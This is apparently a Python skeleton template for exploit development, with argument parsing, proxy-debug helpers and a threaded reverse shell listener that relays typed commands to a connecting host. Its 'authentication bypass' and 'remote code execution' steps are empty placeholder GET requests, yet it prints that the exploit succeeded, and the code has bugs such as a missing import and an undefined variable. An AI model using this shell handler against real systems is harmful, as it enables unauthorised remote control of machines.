#!/usr/bin/python3
import argparse
import requests
import sys
import threading
import base64
import json
import socket


# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print(' >> Python Skeleton Script\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {self.white}{message}{self.end}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {self.yellow}{message}{self.end}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {self.red}{message}{self.end}")

    def success(self, message):
        print(f"[{self.green}âœ“{self.end}] {self.green}{self.bold}{message}{self.end}{self.end}")

def sendPost(url, debug):
    try:
        if debug is True:
            proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
            r = requests.post(url, data=data, proxies = proxies)
        else:
            r = requests.post(url)
            r = requests.post(url, data=data)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?')
        sys.exit(-1)
    return r

def sendGet(url, debug):
    try:
        if debug is True:
            proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
            r = requests.get(url, proxies = proxies)
        else:
            r = requests.get(url)
    except requests.exceptions.ProxyError:
        output.error('Is your proxy running?')
        sys.exit(-1)
    return r

def listen(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    conn, addr = s.accept()
    print('[+] Connection received from ',addr)
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])


def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--ipaddress', help='Listening IP address for reverse shell', required=True)
    parser.add_argument('-lp', '--port', help='Listening port for reverse shell', required=True)
    parser.add_argument('-u', '--username', help='Username to target', required=False)
    parser.add_argument('-p', '--password', help='Password value to set', required=False)
    parser.add_argument('-d', '--debug', help='Instruct our web requests to use our defined proxy', action='store_true', required=False)
    args = parser.parse_args()

    # Instantiate our interface class
    global output
    output = Interface()

    # Banner
    output.header()

    # Debugging
    if args.debug:
        for k,v in sorted(vars(args).items()):
            if k == 'debug':
                output.warning(f"Debugging Mode: {v}")
            else:
                output.info(f"{k}: {v}")
    # Shell listener
    listener_thread = threading.Thread(target=listen, args=(args.ipaddress, args.port))
    listener_thread.start()
    # Authentication Bypass
    # ADded url encoding for requests.
    sendGet(f"http://{args.target}", args.debug)
    # Remote Code Execution
    sendGet(f"http://{args.target}", args.debug)

    # Try Harder
    output.success('Exploit has been successfully executed. :eyes: on your listener!')
    output.info(f'listening on => {args.ipaddress} => {args.port}')
    # exploit
    listener_thread.join()
if __name__ == '__main__':
    main()
